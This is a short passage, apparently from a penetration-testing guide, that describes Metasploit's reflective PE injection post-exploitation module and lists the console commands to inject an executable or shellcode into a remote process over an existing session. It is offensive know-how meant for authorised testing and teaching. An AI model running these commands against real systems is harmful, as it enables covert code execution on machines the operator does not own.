Metasploit offers a **Reflective PE Injection** method that can be used without PowerShell. You can use Metasploit to inject PEs or shellcode into a remote process on the target machine.

```
use post/windows/manage/reflective_pe_inject
set SESSION [Session_ID]
set EXE [Path to PE]
exploit

```
